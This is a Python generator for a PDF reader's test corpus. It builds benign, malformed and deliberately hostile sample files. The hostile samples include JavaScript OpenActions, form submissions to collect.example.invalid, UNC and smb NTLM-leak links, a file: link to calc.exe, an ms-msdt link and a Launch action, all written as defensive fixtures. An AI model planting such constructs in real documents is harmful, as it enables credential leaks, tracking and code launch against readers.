#!/usr/bin/env python3
"""Generates the PDF test corpus (QA-01) using only the Python standard library.

    python tests/corpus/generate.py            # committed files + manifest.json
    python tests/corpus/generate.py --large    # also on-demand files into large/output/

Output is byte-for-byte reproducible on any platform and Python 3.9+: no compression, no
randomness and no timestamps in committed files. CI regenerates the corpus and fails when it
differs from what is committed.

Every malicious sample only *declares* a dangerous action. Targets are `.invalid` domains
(RFC 2606, never resolvable) or programs that do not exist. No sample contains an exploit.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
from dataclasses import dataclass, field
from pathlib import Path

ROOT = Path(__file__).resolve().parent
LARGE_OUTPUT = ROOT / "large" / "output"

LETTER = (612, 792)
A4 = (595, 842)
A3_LANDSCAPE = (1191, 842)


# --------------------------------------------------------------------------- PDF writer


def pdf_string(text: str) -> str:
    """A literal string for ASCII text, with the PDF escapes."""
    escaped = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    return f"({escaped})"


def hex_string(data: bytes) -> str:
    return f"<{data.hex().upper()}>"


class Pdf:
    """Minimal writer: numbered objects, classic xref table, deterministic output."""

    def __init__(self) -> None:
        self.objects: list[bytes | None] = []

    def reserve(self) -> int:
        self.objects.append(None)
        return len(self.objects)

    def set(self, num: int, body: str | bytes) -> int:
        self.objects[num - 1] = body.encode("latin-1") if isinstance(body, str) else body
        return num

    def add(self, body: str | bytes) -> int:
        return self.set(self.reserve(), body)

    @staticmethod
    def stream(dictionary: str, data: bytes) -> bytes:
        head = f"<< {dictionary} /Length {len(data)} >>\nstream\n".encode("latin-1")
        return head + data + b"\nendstream"

    def add_stream(self, dictionary: str, data: bytes) -> int:
        return self.add(self.stream(dictionary, data))

    def build(self, root: int, *, doc_id: bytes, encrypt: int | None = None,
              xref_shift: int = 0) -> bytes:
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = []
        for num, body in enumerate(self.objects, start=1):
            if body is None:
                raise ValueError(f"object {num} was reserved but never set")
            offsets.append(len(out))
            out += f"{num} 0 obj\n".encode("latin-1") + body + b"\nendobj\n"
        xref_at = len(out)
        out += f"xref\n0 {len(offsets) + 1}\n".encode("latin-1")
        out += b"0000000000 65535 f \n"
        for offset in offsets:
            out += f"{offset + xref_shift:010d} 00000 n \n".encode("latin-1")
        trailer = f"/Size {len(offsets) + 1} /Root {root} 0 R /ID [{hex_string(doc_id)} {hex_string(doc_id)}]"
        if encrypt is not None:
            trailer += f" /Encrypt {encrypt} 0 R"
        out += f"trailer\n<< {trailer} >>\nstartxref\n{xref_at}\n%%EOF\n".encode("latin-1")
        return bytes(out)


def doc_id(name: str) -> bytes:
    return hashlib.md5(name.encode("utf-8")).digest()


# --------------------------------------------------------------------------- page helpers


@dataclass
class Page:
    """Content for one page. `lines` are (x, y, size, text) drawn in Helvetica."""

    size: tuple[int, int] = LETTER
    lines: list[tuple[int, int, int, str]] = field(default_factory=list)
    extra_content: bytes = b""
    annots: list[int] = field(default_factory=list)
    extra: str = ""
    resources: str = ""
    fonts: str = ""


def text_ops(lines: list[tuple[int, int, int, str]]) -> bytes:
    ops = []
    for x, y, size, text in lines:
        ops.append(f"BT /F1 {size} Tf {x} {y} Td {pdf_string(text)} Tj ET")
    return ("\n".join(ops) + "\n").encode("latin-1") if ops else b""


class Document:
    """Builds a document with a page tree; callers add catalog entries and annotations."""

    def __init__(self, name: str) -> None:
        self.name = name
        self.pdf = Pdf()
        self.catalog = self.pdf.reserve()
        self.pages_root = self.pdf.reserve()
        self.font = self.pdf.add(
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"
        )
        self.page_nums: list[int] = []
        self.catalog_extra = ""

    def reserve_pages(self, count: int) -> list[int]:
        """Reserve page object numbers so annotations can point at pages before they exist."""
        self.page_nums = [self.pdf.reserve() for _ in range(count)]
        return self.page_nums

    def set_page(self, index: int, page: Page) -> None:
        content = self.pdf.add_stream("", text_ops(page.lines) + page.extra_content)
        width, height = page.size
        annots = f" /Annots [{' '.join(f'{a} 0 R' for a in page.annots)}]" if page.annots else ""
        self.pdf.set(
            self.page_nums[index],
            f"<< /Type /Page /Parent {self.pages_root} 0 R /MediaBox [0 0 {width} {height}]"
            f" /Resources << /Font << /F1 {self.font} 0 R {page.fonts}>> {page.resources}>>"
            f" /Contents {content} 0 R{annots}{page.extra} >>",
        )

    def add_pages(self, pages: list[Page]) -> None:
        self.reserve_pages(len(pages))
        for index, page in enumerate(pages):
            self.set_page(index, page)

    def build(self, **kwargs) -> bytes:
        kids = " ".join(f"{n} 0 R" for n in self.page_nums)
        self.pdf.set(self.pages_root, f"<< /Type /Pages /Kids [{kids}] /Count {len(self.page_nums)} >>")
        self.pdf.set(self.catalog, f"<< /Type /Catalog /Pages {self.pages_root} 0 R{self.catalog_extra} >>")
        return self.pdf.build(self.catalog, doc_id=doc_id(self.name), **kwargs)


def link(doc: Document, rect: tuple[int, int, int, int], action: str) -> int:
    x0, y0, x1, y1 = rect
    return doc.pdf.add(
        f"<< /Type /Annot /Subtype /Link /Rect [{x0} {y0} {x1} {y1}] /Border [0 0 0] /A << {action} >> >>"
    )


def single_page_doc(name: str, lines: list[tuple[int, int, int, str]], **page_kwargs) -> Document:
    doc = Document(name)
    doc.add_pages([Page(lines=lines, **page_kwargs)])
    return doc


def link_sample(name: str, label: str, action: str) -> bytes:
    """One page with visible text and a link annotation carrying `action`."""
    doc = Document(name)
    doc.reserve_pages(1)
    annot = link(doc, (72, 690, 540, 712), action)
    doc.set_page(0, Page(lines=[(72, 740, 14, name), (72, 696, 12, label)], annots=[annot]))
    return doc.build()


def uri_action(uri: bytes) -> str:
    return f"/S /URI /URI {hex_string(uri)}"


# --------------------------------------------------------------------------- benign


def benign_single_page() -> bytes:
    return single_page_doc("single-page", [(72, 720, 24, "Hello, PDF Reader.")]).build()


def benign_multi_page() -> bytes:
    doc = Document("multi-page-10")
    pages = []
    for n in range(1, 11):
        lines = [(72, 720, 24, f"Page {n} of 10")]
        if n == 7:
            lines.append((72, 680, 14, "The search keyword needle appears only on page 7."))
        pages.append(Page(lines=lines))
    doc.add_pages(pages)
    return doc.build()


CJK_TEXT = "隱私優先的 PDF 閱讀器"


def benign_mixed_text() -> bytes:
    doc = Document("mixed-text-zh-en")
    codes = sorted({ord(ch) for ch in CJK_TEXT})
    bfchars = "\n".join(f"<{c:04X}> <{c:04X}>" for c in codes)
    to_unicode = (
        "/CIDInit /ProcSet findresource begin\n12 dict begin\nbegincmap\n"
        "/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def\n"
        "/CMapName /Adobe-Identity-UCS def\n/CMapType 2 def\n"
        "1 begincodespacerange\n<0000> <FFFF>\nendcodespacerange\n"
        f"{len(codes)} beginbfchar\n{bfchars}\nendbfchar\n"
        "endcmap\nCMapName currentdict /CMap defineresource pop\nend\nend\n"
    ).encode("latin-1")
    cmap = doc.pdf.add_stream("", to_unicode)
    descriptor = doc.pdf.add(
        "<< /Type /FontDescriptor /FontName /MingLiU /Flags 6 /FontBBox [0 -200 1000 900]"
        " /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 93 >>"
    )
    cid_font = doc.pdf.add(
        "<< /Type /Font /Subtype /CIDFontType0 /BaseFont /MingLiU"
        " /CIDSystemInfo << /Registry (Adobe) /Ordering (CNS1) /Supplement 0 >>"
        f" /FontDescriptor {descriptor} 0 R >>"
    )
    cjk_font = doc.pdf.add(
        "<< /Type /Font /Subtype /Type0 /BaseFont /MingLiU /Encoding /UniCNS-UCS2-H"
        f" /DescendantFonts [{cid_font} 0 R] /ToUnicode {cmap} 0 R >>"
    )
    cjk_ops = f"BT /F2 20 Tf 72 660 Td <{CJK_TEXT.encode('utf-16-be').hex().upper()}> Tj ET\n"
    doc.add_pages([
        Page(
            lines=[(72, 720, 20, "Privacy-first PDF Reader")],
            extra_content=cjk_ops.encode("latin-1"),
            fonts=f"/F2 {cjk_font} 0 R ",
        )
    ])
    return doc.build()


OUTLINE = [
    # (title, depth, page index)
    ("Chapter 1", 0, 0),
    ("Section 1.1", 1, 1),
    ("Subsection 1.1.1", 2, 2),
    ("Chapter 2", 0, 3),
    ("Section 2.1", 1, 4),
    ("Appendix", 0, 5),
]


def add_outline(doc: Document, entries: list[tuple[str, int, int]]) -> int:
    """Adds a nested outline from a pre-order (title, depth, page) list; returns its root."""
    root = doc.pdf.reserve()
    nums = [doc.pdf.reserve() for _ in entries]
    parents: list[int] = []
    children: dict[int, list[int]] = {root: []}
    for i, (_, depth, _) in enumerate(entries):
        del parents[depth:]
        parent = nums[parents[-1]] if parents else root
        children.setdefault(parent, []).append(i)
        parents.append(i)
    for parent, kids in children.items():
        for k, i in enumerate(kids):
            title, _, page_index = entries[i]
            links = f" /Parent {parent} 0 R"
            if k > 0:
                links += f" /Prev {nums[kids[k - 1]]} 0 R"
            if k + 1 < len(kids):
                links += f" /Next {nums[kids[k + 1]]} 0 R"
            own = children.get(nums[i], [])
            if own:
                links += f" /First {nums[own[0]]} 0 R /Last {nums[own[-1]]} 0 R /Count {len(own)}"
            dest = f"/Dest [{doc.page_nums[page_index]} 0 R /Fit]"
            doc.pdf.set(nums[i], f"<< /Title {pdf_string(title)}{links} {dest} >>")
    top = children[root]
    doc.pdf.set(
        root,
        f"<< /Type /Outlines /First {nums[top[0]]} 0 R /Last {nums[top[-1]]} 0 R /Count {len(top)} >>",
    )
    return root


def benign_outline() -> bytes:
    doc = Document("outline-3-levels")
    doc.reserve_pages(len(OUTLINE))
    for i, (title, _, _) in enumerate(OUTLINE):
        doc.set_page(i, Page(lines=[(72, 720, 24, title)]))
    outline = add_outline(doc, OUTLINE)
    doc.catalog_extra = f" /Outlines {outline} 0 R /PageMode /UseOutlines"
    return doc.build()


def benign_internal_links() -> bytes:
    doc = Document("internal-links")
    doc.reserve_pages(3)
    to_three = doc.pdf.add(
        f"<< /Type /Annot /Subtype /Link /Rect [72 690 300 712] /Border [0 0 0]"
        f" /Dest [{doc.page_nums[2]} 0 R /XYZ 72 720 0] >>"
    )
    to_two = link(doc, (72, 650, 300, 672), f"/S /GoTo /D [{doc.page_nums[1]} 0 R /Fit]")
    doc.set_page(0, Page(
        lines=[(72, 740, 14, "internal-links"), (72, 696, 12, "Go to page 3 (Dest)"),
               (72, 656, 12, "Go to page 2 (GoTo action)")],
        annots=[to_three, to_two],
    ))
    doc.set_page(1, Page(lines=[(72, 720, 24, "Page 2")]))
    doc.set_page(2, Page(lines=[(72, 720, 24, "Page 3")]))
    return doc.build()


def benign_external_link() -> bytes:
    return link_sample("external-https-link", "https://example.invalid/docs",
                       uri_action(b"https://example.invalid/docs"))


def benign_rotated() -> bytes:
    doc = Document("rotated-page")
    doc.add_pages([
        Page(lines=[(72, 720, 24, "Page 1: not rotated")]),
        Page(lines=[(72, 720, 24, "Page 2: /Rotate 90")], extra=" /Rotate 90"),
    ])
    return doc.build()


def benign_page_sizes() -> bytes:
    doc = Document("mixed-page-sizes")
    doc.add_pages([
        Page(size=A4, lines=[(72, 760, 20, "A4 portrait")]),
        Page(size=LETTER, lines=[(72, 720, 20, "US Letter portrait")]),
        Page(size=A3_LANDSCAPE, lines=[(72, 760, 20, "A3 landscape")]),
        Page(size=(200, 200), lines=[(20, 100, 12, "200 x 200 pt")]),
    ])
    return doc.build()


def gradient_rgb(width: int, height: int) -> bytes:
    data = bytearray()
    for y in range(height):
        for x in range(width):
            data += bytes((x * 255 // (width - 1), y * 255 // (height - 1), 128))
    return bytes(data)


def benign_image_only() -> bytes:
    doc = Document("image-only")
    image = doc.pdf.add_stream(
        "/Type /XObject /Subtype /Image /Width 64 /Height 64 /ColorSpace /DeviceRGB /BitsPerComponent 8",
        gradient_rgb(64, 64),
    )
    doc.add_pages([Page(
        extra_content=b"q 468 0 0 648 72 72 cm /Im1 Do Q\n",
        resources=f"/XObject << /Im1 {image} 0 R >> ",
    )])
    return doc.build()


# RC4 and the standard security handler, revision 2 (PDF 1.7, 7.6.3). Enough to produce an
# encrypted sample without third-party tools; AES-256 needs MuPDF tooling (see README).
PASSWORD_PADDING = bytes.fromhex(
    "28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A"
)


def rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) % 256])
    return bytes(out)


def pad_password(password: str) -> bytes:
    return (password.encode("latin-1") + PASSWORD_PADDING)[:32]


def benign_encrypted() -> bytes:
    name = "encrypted-rc4-40"
    user_password, owner_password, permissions = "user", "owner", -44
    ident = doc_id(name)
    owner_key = hashlib.md5(pad_password(owner_password)).digest()[:5]
    o_value = rc4(owner_key, pad_password(user_password))
    key = hashlib.md5(
        pad_password(user_password) + o_value + permissions.to_bytes(4, "little", signed=True) + ident
    ).digest()[:5]
    u_value = rc4(key, PASSWORD_PADDING)

    doc = Document(name)
    doc.reserve_pages(1)
    content_num = doc.pdf.reserve()
    object_key = hashlib.md5(key + content_num.to_bytes(3, "little") + (0).to_bytes(2, "little")).digest()[:10]
    plain = text_ops([(72, 720, 24, "Encrypted sample (user password: user)")])
    doc.pdf.set(content_num, Pdf.stream("", rc4(object_key, plain)))
    doc.pdf.set(
        doc.page_nums[0],
        f"<< /Type /Page /Parent {doc.pages_root} 0 R /MediaBox [0 0 612 792]"
        f" /Resources << /Font << /F1 {doc.font} 0 R >> >> /Contents {content_num} 0 R >>",
    )
    encrypt = doc.pdf.add(
        f"<< /Filter /Standard /V 1 /R 2 /Length 40 /O {hex_string(o_value)}"
        f" /U {hex_string(u_value)} /P {permissions} >>"
    )
    return doc.build(encrypt=encrypt)


# --------------------------------------------------------------------------- malicious


JS = pdf_string("app.alert('This script must never run.');")


def malicious_js_document() -> bytes:
    doc = single_page_doc("js-document-level", [(72, 720, 14, "Document-level JavaScript (name tree)")])
    action = doc.pdf.add(f"<< /S /JavaScript /JS {JS} >>")
    doc.catalog_extra = f" /Names << /JavaScript << /Names [(init) {action} 0 R] >> >>"
    return doc.build()


def malicious_openaction_js() -> bytes:
    doc = single_page_doc("openaction-js", [(72, 720, 14, "/OpenAction JavaScript")])
    doc.catalog_extra = f" /OpenAction << /S /JavaScript /JS {JS} >>"
    return doc.build()


def malicious_openaction_uri() -> bytes:
    doc = single_page_doc("openaction-uri", [(72, 720, 14, "/OpenAction URI (tracking beacon)")])
    doc.catalog_extra = f" /OpenAction << {uri_action(b'https://beacon.example.invalid/opened')} >>"
    return doc.build()


def malicious_page_aa() -> bytes:
    doc = single_page_doc(
        "page-aa", [(72, 720, 14, "Page /AA open and close actions")],
        extra=f" /AA << /O << /S /JavaScript /JS {JS} >> /C << /S /JavaScript /JS {JS} >> >>",
    )
    return doc.build()


def form_doc(name: str, label: str, field_body: str) -> bytes:
    doc = Document(name)
    doc.reserve_pages(1)
    widget = doc.pdf.add(
        f"<< /Type /Annot /Subtype /Widget /Rect [72 650 300 680] /F 4"
        f" /P {doc.page_nums[0]} 0 R /MK << /BG [0.9 0.9 0.9] >> {field_body} >>"
    )
    doc.set_page(0, Page(lines=[(72, 720, 14, label)], annots=[widget]))
    doc.catalog_extra = f" /AcroForm << /Fields [{widget} 0 R] /NeedAppearances true >>"
    return doc.build()


def malicious_field_aa() -> bytes:
    return form_doc(
        "field-aa", "Text field with /AA keystroke and format scripts",
        f"/FT /Tx /T (amount) /AA << /K << /S /JavaScript /JS {JS} >> /F << /S /JavaScript /JS {JS} >> >>",
    )


def malicious_submitform() -> bytes:
    return form_doc(
        "submitform", "Button that submits the form to a remote URL",
        "/FT /Btn /Ff 65536 /T (send) /A << /S /SubmitForm"
        " /F << /FS /URL /F (https://collect.example.invalid/submit) >> /Flags 4 >>",
    )


def malicious_importdata() -> bytes:
    return form_doc(
        "importdata", "Button that imports form data from a file",
        "/FT /Btn /Ff 65536 /T (load) /A << /S /ImportData /F (does-not-exist.example.fdf) >>",
    )


def malicious_launch() -> bytes:
    return link_sample(
        "launch", "Launch action (program does not exist)",
        "/S /Launch /F (does-not-exist.example.exe)"
        " /Win << /F (does-not-exist.example.exe) /P (--never-run) >> /NewWindow true",
    )


def malicious_gotor_unc() -> bytes:
    return link_sample(
        "gotor-unc", "GoToR to a UNC path (SMB/NTLM leak on Windows)",
        r"/S /GoToR /F (\\\\share.example.invalid\\x\\doc.pdf) /D [0 /Fit]",
    )


def malicious_gotoe() -> bytes:
    return link_sample(
        "gotoe", "GoToE into an embedded document",
        "/S /GoToE /T << /R /C /N (attached.pdf) >> /D [0 /Fit]",
    )


def malicious_remote_filespec() -> bytes:
    doc = Document("remote-filespec")
    image = doc.pdf.add(Pdf.stream(
        "/Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace /DeviceGray"
        " /BitsPerComponent 8 /F << /FS /URL /F (https://img.example.invalid/beacon.png) >>",
        b"",
    ))
    doc.add_pages([Page(
        lines=[(72, 720, 14, "Image XObject whose data is an external URL stream")],
        extra_content=b"q 100 0 0 100 72 500 cm /Im1 Do Q\n",
        resources=f"/XObject << /Im1 {image} 0 R >> ",
    )])
    return doc.build()


def malicious_xfa() -> bytes:
    xdp = (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        b'  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">\n'
        b'    <subform name="form1"><event activity="initialize">'
        b'<submit target="https://collect.example.invalid/xfa"/></event></subform>\n'
        b"  </template>\n</xdp:xdp>\n"
    )
    doc = Document("xfa")
    doc.reserve_pages(1)
    xfa = doc.pdf.add_stream("", xdp)
    doc.set_page(0, Page(lines=[(72, 720, 14, "XFA form with a remote submit")]))
    doc.catalog_extra = f" /AcroForm << /Fields [] /XFA {xfa} 0 R >>"
    return doc.build()


def malicious_embedded_file() -> bytes:
    doc = single_page_doc("embedded-file", [(72, 720, 14, "Document with an embedded file")])
    data = doc.pdf.add_stream("/Type /EmbeddedFile /Subtype /text#2Fplain", b"hello from an attachment\n")
    spec = doc.pdf.add(f"<< /Type /Filespec /F (note.txt) /UF (note.txt) /EF << /F {data} 0 R >> >>")
    doc.catalog_extra = f" /Names << /EmbeddedFiles << /Names [(note.txt) {spec} 0 R] >> >>"
    return doc.build()


def link_scheme_sample(name: str, uri: bytes, label: str) -> bytes:
    return link_sample(name, label, uri_action(uri))


LONG_URL = b"https://example.invalid/" + b"a" * (10_000 - len(b"https://example.invalid/"))


# --------------------------------------------------------------------------- malformed


def malformed_truncated() -> bytes:
    data = benign_multi_page()
    return data[: len(data) * 6 // 10]


def malformed_broken_xref() -> bytes:
    doc = Document("broken-xref")
    doc.add_pages([Page(lines=[(72, 720, 24, "Every xref offset is wrong")])])
    return doc.build(xref_shift=7)


def malformed_page_tree_cycle() -> bytes:
    pdf = Pdf()
    catalog, pages = pdf.reserve(), pdf.reserve()
    pdf.set(pages, f"<< /Type /Pages /Kids [{pages} 0 R] /Count 1 >>")
    pdf.set(catalog, f"<< /Type /Catalog /Pages {pages} 0 R >>")
    return pdf.build(catalog, doc_id=doc_id("page-tree-cycle"))


def malformed_outline_cycle() -> bytes:
    doc = Document("outline-cycle")
    doc.add_pages([Page(lines=[(72, 720, 24, "Outline items point at each other")])])
    root, a, b = doc.pdf.reserve(), doc.pdf.reserve(), doc.pdf.reserve()
    dest = f"/Dest [{doc.page_nums[0]} 0 R /Fit]"
    doc.pdf.set(a, f"<< /Title (A) /Parent {root} 0 R /Next {b} 0 R {dest} >>")
    doc.pdf.set(b, f"<< /Title (B) /Parent {root} 0 R /Next {a} 0 R /Prev {a} 0 R {dest} >>")
    doc.pdf.set(root, f"<< /Type /Outlines /First {a} 0 R /Last {b} 0 R /Count 2 >>")
    doc.catalog_extra = f" /Outlines {root} 0 R"
    return doc.build()


def malformed_huge_page() -> bytes:
    doc = Document("huge-page-size")
    doc.add_pages([Page(size=(1_000_000_000, 1_000_000_000), lines=[(72, 720, 24, "MediaBox 1e9 x 1e9")])])
    return doc.build()


def malformed_deep_nesting() -> bytes:
    depth = 10_000
    doc = Document("deep-nesting")
    doc.add_pages([Page(lines=[(72, 720, 24, "10,000 nested arrays")], extra=" /Junk " + "[" * depth + "]" * depth)])
    return doc.build()


def malformed_no_pages() -> bytes:
    doc = Document("no-pages")
    return doc.build()


# --------------------------------------------------------------------------- on demand


def large_1000_pages(path: Path) -> None:
    """~200 MB: 1000 pages, each with a 256 x 256 RGB image (uncompressed) and searchable text."""
    rng = random.Random(1000)
    doc = Document("large-1000-pages")
    doc.reserve_pages(1000)
    for i in range(1000):
        image = doc.pdf.add_stream(
            "/Type /XObject /Subtype /Image /Width 256 /Height 256 /ColorSpace /DeviceRGB /BitsPerComponent 8",
            rng.randbytes(256 * 256 * 3),
        )
        doc.set_page(i, Page(
            lines=[(72, 740, 20, f"Page {i + 1} of 1000"),
                   (72, 716, 12, f"Search target: needle-{i + 1:04d} and the common word privacy.")],
            extra_content=b"q 468 0 0 468 72 180 cm /Im1 Do Q\n",
            resources=f"/XObject << /Im1 {image} 0 R >> ",
        ))
    path.write_bytes(doc.build())


def outline_100k(path: Path) -> None:
    """100,000 top-level outline items (exceeds the 10,000 item limit; must be truncated)."""
    entries = [(f"Item {n}", 0, 0) for n in range(100_000)]
    doc = Document("outline-100k-items")
    doc.reserve_pages(1)
    doc.set_page(0, Page(lines=[(72, 720, 24, "100,000 outline items")]))
    doc.catalog_extra = f" /Outlines {add_outline(doc, entries)} 0 R"
    path.write_bytes(doc.build())


# --------------------------------------------------------------------------- corpus


@dataclass
class Sample:
    path: str
    build: object
    purpose: str
    expected: str
    pages: int | None = None
    findings: list[str] = field(default_factory=list)
    text: list[str] = field(default_factory=list)


SAMPLES = [
    # benign
    Sample("benign/single-page.pdf", benign_single_page, "Smallest valid document.",
           "Opens; one Letter page.", 1, text=["Hello, PDF Reader."]),
    Sample("benign/multi-page-10.pdf", benign_multi_page, "Ten pages; a unique keyword on page 7.",
           "Opens; 10 pages; searching 'needle' finds exactly one hit on page 7.", 10,
           text=["Page 1 of 10", "needle"]),
    Sample("benign/mixed-text-zh-en.pdf", benign_mixed_text,
           "English and Traditional Chinese text (Type0 font, non-embedded, with ToUnicode).",
           "Opens; both strings are searchable. CJK glyphs may render as fallback boxes if no CJK font is available.",
           1, text=["Privacy-first PDF Reader", CJK_TEXT]),
    Sample("benign/outline-3-levels.pdf", benign_outline, "Three-level outline over six pages.",
           "Outline shows Chapter 1 > Section 1.1 > Subsection 1.1.1, Chapter 2 > Section 2.1, Appendix; each jumps to its page.",
           6),
    Sample("benign/internal-links.pdf", benign_internal_links, "Internal links (Dest and GoTo action).",
           "Clicking the links on page 1 navigates to pages 3 and 2 without any dialog.", 3),
    Sample("benign/external-https-link.pdf", benign_external_link, "One external https link.",
           "Clicking shows a confirmation dialog with the full URL; cancelling does nothing.", 1),
    Sample("benign/rotated-page.pdf", benign_rotated, "Second page has /Rotate 90.",
           "Page 2 is displayed rotated 90 degrees clockwise.", 2),
    Sample("benign/mixed-page-sizes.pdf", benign_page_sizes, "A4, Letter, A3 landscape and a 200 x 200 pt page.",
           "Each page keeps its own size.", 4),
    Sample("benign/image-only.pdf", benign_image_only, "A page with an image and no text layer.",
           "Renders a gradient; search reports that the document has no text layer.", 1),
    Sample("benign/encrypted-rc4-40.pdf", benign_encrypted,
           "Encrypted with the standard handler (RC4 40-bit, R2); user password 'user', owner password 'owner'.",
           "MVP: reported as encrypted and not supported; no crash.", 1),
    # malicious
    Sample("malicious/js-document-level.pdf", malicious_js_document, "Document-level JavaScript in the names tree.",
           "No script runs; finding reported.", 1, ["javaScript"]),
    Sample("malicious/openaction-js.pdf", malicious_openaction_js, "JavaScript in /OpenAction.",
           "No script runs on open; findings reported.", 1, ["javaScript", "openAction"]),
    Sample("malicious/openaction-uri.pdf", malicious_openaction_uri, "URI in /OpenAction (open-tracking beacon).",
           "Nothing is opened or fetched; finding reported.", 1, ["openAction"]),
    Sample("malicious/page-aa.pdf", malicious_page_aa, "Page open/close additional actions with JavaScript.",
           "No script runs when the page is shown or hidden; findings reported.", 1,
           ["javaScript", "additionalActions"]),
    Sample("malicious/field-aa.pdf", malicious_field_aa, "Form field keystroke/format scripts.",
           "No script runs; findings reported.", 1, ["javaScript", "additionalActions"]),
    Sample("malicious/submitform.pdf", malicious_submitform, "Button submitting the form to a remote URL.",
           "Nothing is sent; finding reported.", 1, ["submitForm"]),
    Sample("malicious/importdata.pdf", malicious_importdata, "Button importing form data from a file.",
           "No file is read; finding reported.", 1, ["importData"]),
    Sample("malicious/launch.pdf", malicious_launch, "Link with a /Launch action (nonexistent program).",
           "No program starts; the link is shown as blocked; finding reported.", 1, ["launch"]),
    Sample("malicious/gotor-unc.pdf", malicious_gotor_unc, "GoToR to a UNC path.",
           "No SMB connection is attempted; link blocked; findings reported.", 1,
           ["remoteGoTo", "uncReference"]),
    Sample("malicious/gotoe.pdf", malicious_gotoe, "GoToE into an embedded document.",
           "Link blocked; finding reported.", 1, ["embeddedGoTo"]),
    Sample("malicious/remote-filespec.pdf", malicious_remote_filespec,
           "Image XObject whose data is an external stream at a URL (remote resource beacon).",
           "Nothing is fetched; the image is not drawn; finding reported.", 1, ["remoteFileSpec"]),
    Sample("malicious/xfa.pdf", malicious_xfa, "XFA form with a remote submit event.",
           "XFA is ignored; finding reported.", 1, ["xfa"]),
    Sample("malicious/embedded-file.pdf", malicious_embedded_file, "Document with an embedded file.",
           "The attachment is never opened or extracted automatically; finding reported.", 1, ["embeddedFile"]),
    Sample("malicious/link-javascript-scheme.pdf",
           lambda: link_scheme_sample("link-javascript-scheme", b"javascript:app.alert(1)", "javascript: URI"),
           "URI link with the javascript: scheme.", "Blocked with an explanation; nothing runs.", 1),
    Sample("malicious/link-file-scheme.pdf",
           lambda: link_scheme_sample("link-file-scheme", b"file:///C:/Windows/System32/calc.exe", "file: URI"),
           "URI link with the file: scheme.", "Blocked with an explanation; nothing opens.", 1),
    Sample("malicious/link-smb-scheme.pdf",
           lambda: link_scheme_sample("link-smb-scheme", b"smb://share.example.invalid/x", "smb: URI"),
           "URI link with the smb: scheme.", "Blocked with an explanation; no SMB connection.", 1),
    Sample("malicious/link-unc-uri.pdf",
           lambda: link_scheme_sample("link-unc-uri", b"\\\\share.example.invalid\\x", "UNC path as URI"),
           "URI link whose value is a UNC path.", "Blocked with an explanation; no SMB connection.", 1),
    Sample("malicious/link-ms-protocol.pdf",
           lambda: link_scheme_sample("link-ms-protocol", b"ms-msdt:/id PCWDiagnostic", "ms-msdt: URI"),
           "URI link with a Windows protocol handler scheme.", "Blocked with an explanation; nothing starts.", 1),
    Sample("malicious/link-idn-homograph.pdf",
           lambda: link_scheme_sample("link-idn-homograph", "https://\u0430pple.example.invalid/".encode("utf-8"),
                                      "IDN homograph (Cyrillic a)"),
           "https link whose host uses a Cyrillic 'а' (UTF-8 bytes).",
           "Confirmation dialog shows the punycode host and an IDN warning.", 1),
    Sample("malicious/link-rtl-override.pdf",
           lambda: link_scheme_sample("link-rtl-override", "https://example.invalid/\u202Efdp.exe".encode("utf-8"),
                                      "URL containing U+202E"),
           "https link containing a right-to-left override character.",
           "Confirmation dialog shows the control character visibly and warns.", 1),
    Sample("malicious/link-long-url.pdf",
           lambda: link_scheme_sample("link-long-url", LONG_URL, "10,000-character URL"),
           "https link with a 10,000-character URL.", "Confirmation dialog shows the whole URL (scrollable).", 1),
    # malformed
    Sample("malformed/truncated.pdf", malformed_truncated, "multi-page-10.pdf cut at 60%.",
           "Opens with repair or reports corrupted; never crashes."),
    Sample("malformed/broken-xref.pdf", malformed_broken_xref, "Every xref offset is off by 7 bytes.",
           "Opens after repair (1 page) or reports corrupted; never crashes."),
    Sample("malformed/page-tree-cycle.pdf", malformed_page_tree_cycle, "The page tree lists itself as a kid.",
           "Reports corrupted; never hangs or crashes."),
    Sample("malformed/outline-cycle.pdf", malformed_outline_cycle, "Outline items whose /Next pointers form a cycle.",
           "Opens; the outline is cut at the cycle; never hangs.", 1),
    Sample("malformed/huge-page-size.pdf", malformed_huge_page, "MediaBox of 1e9 x 1e9 points.",
           "Rejected by validation or rendered within the raster limits; never allocates unbounded memory."),
    Sample("malformed/deep-nesting.pdf", malformed_deep_nesting, "10,000 nested arrays in the page dictionary.",
           "Opens or reports corrupted; no stack overflow."),
    Sample("malformed/no-pages.pdf", malformed_no_pages, "Structurally valid document with zero pages.",
           "Reports corrupted (a document needs at least one page)."),
    Sample("malformed/not-a-pdf.pdf", lambda: b"This is a plain text file with a .pdf extension.\n",
           "Text file named .pdf.", "Reports not a PDF."),
    Sample("malformed/empty.pdf", lambda: b"", "Zero bytes.", "Reports not a PDF or corrupted."),
]

ON_DEMAND = [
    ("large/output/large-1000-pages.pdf", large_1000_pages,
     "About 200 MB: 1000 pages with a 256 x 256 RGB image and searchable text each (MVP-07, MVP-10).",
     "Opens; memory stays bounded while scrolling; 'needle-0500' finds one hit on page 500.", 1000),
    ("large/output/outline-100k-items.pdf", outline_100k,
     "100,000 outline items (MVP-09).", "Outline truncated at the limit and flagged; no hang.", 1),
]


def check_structure(data: bytes) -> None:
    """Verifies that every in-use xref entry points at its `N 0 obj` header."""
    xref_at = int(data[data.rindex(b"startxref") + 10:].split()[0])
    lines = data[xref_at:].split(b"\n")
    count = int(lines[1].split()[1])
    for num in range(1, count):
        offset = int(lines[2 + num][:10])
        header = f"{num} 0 obj".encode("latin-1")
